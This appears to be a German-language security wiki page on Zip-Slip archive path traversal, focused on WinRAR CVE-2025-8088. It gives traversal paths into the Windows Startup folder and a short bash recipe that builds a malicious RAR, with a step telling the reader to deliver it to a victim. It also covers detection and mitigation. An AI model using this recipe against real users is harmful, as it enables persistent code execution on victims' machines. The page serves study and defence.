# Archivextraktions-Pfadüberquerung ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Übersicht

Viele Archivformate (ZIP, RAR, TAR, 7-ZIP usw.) erlauben es jedem Eintrag, seinen eigenen **internen Pfad** zu tragen. Wenn ein Extraktionswerkzeug diesen Pfad blind akzeptiert, wird ein gestalteter Dateiname, der `..` oder einen **absoluten Pfad** (z. B. `C:\Windows\System32\`) enthält, außerhalb des vom Benutzer gewählten Verzeichnisses geschrieben. Diese Art von Schwachstelle ist weithin bekannt als *Zip-Slip* oder **Archivextraktions-Pfadüberquerung**.

Die Folgen reichen von der Überschreibung beliebiger Dateien bis hin zur direkten Erreichung von **Remote Code Execution (RCE)**, indem ein Payload an einem **Auto-Run**-Standort wie dem Windows *Startup*-Ordner abgelegt wird.

## Grundursache

1. Angreifer erstellt ein Archiv, in dem einer oder mehrere Dateiköpfe enthalten sind:
* Relative Traversalsequenzen (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute Pfade (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
2. Opfer extrahiert das Archiv mit einem verwundbaren Tool, das dem eingebetteten Pfad vertraut, anstatt ihn zu bereinigen oder die Extraktion unter dem gewählten Verzeichnis zu erzwingen.
3. Die Datei wird im vom Angreifer kontrollierten Standort geschrieben und beim nächsten Triggern dieses Pfades durch das System oder den Benutzer ausgeführt/geladen.

## Beispiel aus der Praxis – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR für Windows (einschließlich der `rar` / `unrar` CLI, der DLL und des tragbaren Quellcodes) konnte Dateinamen während der Extraktion nicht validieren. Ein bösartiges RAR-Archiv, das einen Eintrag wie enthält:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
würde **außerhalb** des ausgewählten Ausgabeverzeichnisses und im *Startup*-Ordner des Benutzers landen. Nach dem Anmelden führt Windows automatisch alles aus, was dort vorhanden ist, was *persistente* RCE ermöglicht.

### Erstellen eines PoC-Archivs (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options verwendet:
* `-ep`  – Dateipfade genau so speichern, wie sie angegeben sind (nicht führendes `./` entfernen).

Liefern Sie `evil.rar` an das Opfer und weisen Sie es an, es mit einer verwundbaren WinRAR-Version zu extrahieren.

### Beobachtete Ausnutzung in der Wildnis

ESET berichtete über RomCom (Storm-0978/UNC2596) Spear-Phishing-Kampagnen, die RAR-Archive anfügten, die CVE-2025-8088 ausnutzten, um angepasste Hintertüren zu installieren und Ransomware-Operationen zu erleichtern.

## Erkennungstipps

* **Statische Inspektion** – Listen Sie Archiv-Einträge auf und kennzeichnen Sie jeden Namen, der `../`, `..\\`, *absolute Pfade* (`C:`) oder nicht-kanonische UTF-8/UTF-16-Codierungen enthält.
* **Sandbox-Extraktion** – Dekomprimieren Sie in ein temporäres Verzeichnis mit einem *sicheren* Extraktor (z. B. Pythons `patool`, 7-Zip ≥ neueste Version, `bsdtar`) und überprüfen Sie, ob die resultierenden Pfade im Verzeichnis bleiben.
* **Endpoint-Überwachung** – Alarmieren Sie bei neuen ausführbaren Dateien, die kurz nach dem Öffnen eines Archivs durch WinRAR/7-Zip/etc. in `Startup`/`Run`-Verzeichnisse geschrieben werden.

## Minderung & Härtung

1. **Aktualisieren Sie den Extraktor** – WinRAR 7.13 implementiert eine ordnungsgemäße Pfadsanierung. Benutzer müssen es manuell herunterladen, da WinRAR über keinen Auto-Update-Mechanismus verfügt.
2. Extrahieren Sie Archive mit der **„Pfad ignorieren“**-Option (WinRAR: *Extrahieren → "Keine Pfade extrahieren"*) wann immer möglich.
3. Öffnen Sie nicht vertrauenswürdige Archive **in einer Sandbox** oder VM.
4. Implementieren Sie Anwendungs-Whitelisting und beschränken Sie den Schreibzugriff der Benutzer auf Auto-Run-Verzeichnisse.

## Zusätzliche betroffene / historische Fälle

* 2018 – Massive *Zip-Slip*-Warnung von Snyk, die viele Java/Go/JS-Bibliotheken betrifft.
* 2023 – 7-Zip CVE-2023-4011 ähnliche Traversierung während des `-ao`-Mergers.
* Jede benutzerdefinierte Extraktionslogik, die es versäumt, `PathCanonicalize` / `realpath` vor dem Schreiben aufzurufen.

## Referenzen

- [BleepingComputer – WinRAR Zero-Day ausgenutzt, um Malware bei der Archivextraktion zu platzieren](https://www.bleepingcomputer.com/news/security/winrar-zero-day-flaw-exploited-by-romcom-hackers-in-phishing-attacks/)
- [WinRAR 7.13 Änderungsprotokoll](https://www.win-rar.com/singlenewsview.html?&L=0&tx_ttnews%5Btt_news%5D=283&cHash=a64b4a8f662d3639dec8d65f47bc93c5)
- [Snyk – Zip Slip-Sicherheitsanfälligkeit](https://snyk.io/research/zip-slip-vulnerability)

{{#include ../banners/hacktricks-training.md}}
